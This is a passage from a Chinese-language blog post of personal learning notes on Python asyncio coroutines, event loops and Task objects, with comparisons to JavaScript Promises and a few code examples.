很直觉直接用就可以，在学习 Python 协程的过程中，我发现我对 JavaScript Promise 也忘了不少，之前写过一个博客记录。</p>\n<h2 id=\"一开始我不熟悉-python-asyncio\">一开始我不熟悉 Python asyncio</h2>\n<p>Python 的协程用起来需要用<code>asyncio.run()</code>，在 Python 3.6 还没有<code>asyncio.run()</code>。<code>asyncio.create_task()</code> 为什么报错 No running event loop</p>\n<pre><code class=\"language-python\">Python 3.12.3 (main, Jan  8 2026, 11:30:50) [GCC 13.3.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; import asyncio\n&gt;&gt;&gt; async def foo(): ...\n...\n&gt;&gt;&gt; asyncio.create_task(foo())\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\n  File \"/usr/lib/python3.12/asyncio/tasks.py\", line 417, in create_task\n    loop = events.get_running_loop()\n           ^^^^^^^^^^^^^^^^^^^^^^^^^\nRuntimeError: no running event loop\n&gt;&gt;&gt;\n</code></pre>\n<h2 id=\"协程不会立刻执行\">协程不会立刻执行</h2>\n<p>调用异步函数，创建了一个协程对象。协程对象内部的逻辑不会立刻执行，等到事件循环拥有控制权，并且启动/继续协程的时候，协程的逻辑才会执行。</p>\n<pre><code class=\"language-python\">Python 3.12.3 (main, Jan  8 2026, 11:30:50) [GCC 13.3.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; import asyncio\n&gt;&gt;&gt; async def foo(): print('bar')\n...\n&gt;&gt;&gt; foo()\n&lt;coroutine object foo at 0x720ef6db5a80&gt;\n&gt;&gt;&gt;\n</code></pre>\n<p>我们可以看到协程的内部的逻辑没有执行。要执行这个协程我们可以使用 <code>asyncio.run()</code>。</p>\n<pre><code class=\"language-python\">&gt;&gt;&gt; asyncio.run(foo())\nbar\n</code></pre>\n<p>在 Python 的协程中，要想启动另外一个协程，就要用 <code>asyncio.create_task()</code> 创建一个 Task 并且和事件循环关联起来，这个函数会找到当前正在运行的事件循环。一个线程只有一个正在运行的事件循环。</p>\n<p><code>asyncio.run()</code> 和 <code>asyncio.create_task()</code> 帮我做了一些事情，但是我不知道他到底干什么了。老实说，我很讨厌编程语言各种隐式的行为。</p>\n<p><code>asyncio.run()</code> 相当于是这样几行：</p>\n<pre><code class=\"language-python\">loop = asyncio.new_event_loop()\ntask = asyncio.Task(foo(), loop=loop)\nloop.run_util_complete(task)\n</code></pre>\n<p>run_util_complete 支持 coroutine，也可以不手动创建 Task.</p>\n<pre><code class=\"language-python\">loop = asyncio.new_event_loop()\nloop.run_util_complete(foo())\n</code></pre>\n<p>我们见到了手动创建 Task 的方法，可以想象到 create_task 是如何知道放在哪个事件循环上的。</p>\n<pre><code class=\"language-python\">def create_task(coro):\n  loop = asyncio.get_running_loop()\n  return asyncio.Task(coro, loop=loop)\n</code></pre>\n<p>JavaScript 调用异步函数直接就执行了函数体，哪怕你不加 await。JavaScript 异步函数体就相当于传递给 Promise 的回调函数。</p>\n<pre><code class=\"language-js\">let promise = new Promise(function(resolve, reject) {\n  // this function will executes immediately\n})\n</code></pre>\n<h2 id=\"让步控制权给事件循环\">让步控制权给事件循环</h2>\n<pre><code>class YieldToEventLoop:\n    def __await__(self):\n        yield\n</code></pre>\n<blockquote>\n<p>The only way to yield (or effectively cede control) from a coroutine is to await an object that <code>yield</code>s in its <code>__await__</code> method.</p>\n</blockquote>\n<p><strong>在一个对象的 <code>__await__</code> 方法中 yield 是让步控制权给事件循环的唯一的方式</strong>。<code>await object</code> 会调用对象的 <code>__awit__</code> 方法。</p>\n<p>await coroutine 不会将控制权交给事件循环，简单的 await coroutine 就好似 yield from generator。这对熟悉 JavaScript 协程的人是很反直觉的。Python 的经典协程，也就是 Python 生成器当作协程使用，但是我们没有事件循环。</p>\n<p>coroutine 指的是 coroutine object。调用一个 async function 会创建一个 coroutine object。</p>\n<p><strong>await 一个 Task(Future) 对象就会让步控制给事件循环</strong>。Task 是 Future 的子类，Future 的 <code>__await__</code> 方法会 yield。</p>\n<p>注意，我们不能直接在异步函数（协程函数）里面直接写 yield 实现让步控制给事件循环，调用函数就会变成异步生成器。</p>\n<h2 id=\"我们需要持有-task-对象并且-await\">我们需要持有 Task 对象，并且 await</h2>\n<blockquote>\n<p>It’s important to be aware that the task itself is not added to the event loop, only a callback to the task is. This matters if the task object you created is garbage collected before it’s called by the event loop</p>\n</blockquote>\n<p>Task 对象一定要有变量持有，并 await。不然当变量超出作用域，被 GC 回收后，协程没执行完自己就静悄悄退出了（不会报错）。Task 对象 GC 回收，<s>那么 coroutine 对象也被回收了</s>。</p>\n<p>说实话，我很难理解事件循环没有 Task 对象。但是反过来 JavaScript 的 Promise .then 的时候不就是在注册回调函数吗，V8 的微任务队列里面不是保存 Promise 的对象，是回调函数啊。</p>\n<pre><code class=\"language-python\">import asyncio\n\nasync def async_print(str):\n    print(str)\n\nasync def coro_a():\n    for _ in range(3):\n        await async_print(\"I am coro_a()!\")\n\nclass YieldToEventLoop:\n    def __await__(self):\n        yield\n\nasync def coro_b():\n    for _ in range(3):\n        print(\"I am coro_b()!\")\n        await YieldToEventLoop() # neccessay to show coro_b() one time\n\nasync def main():\n    task = asyncio.create_task(coro_b())\n    await coro_a()\n\nasyncio.run(main())\n\n# Output:\n# I am coro_a()!\n# I am coro_a()!\n# I am coro_a()!\n# I am coro_b()!\n\n</code></pre>\n<p>如果读懂了这个例子，那也就读懂了整篇笔记或者原文了。</p>\n<p>main() 函数创建 task 后没有 await task，不会让步控制权给事件循环，所以 main 函数继续执行。await coro_a 在 await coroutine，不会让步控制给事件循环，执行 coro_a()。<code>coro_a()</code> await 的也是协程对象，也不会让步给事件循环，所以连着打印了三次<code>I am coro_a()!</code>。循环执行完毕后 <code>main()</code> 协程对象执行完了，事件循环才拿到控制权，开始执行 <code>coro_b</code> 的逻辑。<code>coro_b</code> 刚开始一次，协程 <code>await YieldToEvnetLoop</code> 让步控制给事件循环。因为 main() 函数早已执行完毕退出 task 早已超出作用域，被 GC 回收，等事件循环再次运行 coro_b 的时候发现对应的 Task 对象已经被 GC 回收了。所以就打印了一次 <code>I am coro_b()!</code>。</p>\n<p>我很好奇，这个地方创建回调函数的时候怎么就没有形成闭包呢？怎么就没有把 task 对象隐藏在闭包里面呢？</p>\n<h2 id=\"总结\">总结</h2>\n<p>await 协程不会让步控制权，await Future 才会让步控制权给 Event Loop。实现协程让步就是在 <code>__await__</code> 方法中 yield。</p>\n<p>Python 不像 JavaScript 有微任务队列，我们需要自己主动去创建事件循环，并将任务放到事件循环中去，当然更准确的说法是在事件循环中注册回调函数。也就是 <code>asyncio.create_task()</code>, <code>asyncio.run()</code> 这两个函数。</p>\n<p>JavaScript 都是 Promise 对象，await Promise 对象就会让步。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 14:07</span>&nbsp;\n<a href=\"https://www.cnblogs.com/wngtk\">wngtk</a>&nbsp;\n阅读(<span id=\"post_view_count\">76</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    }
  ]
}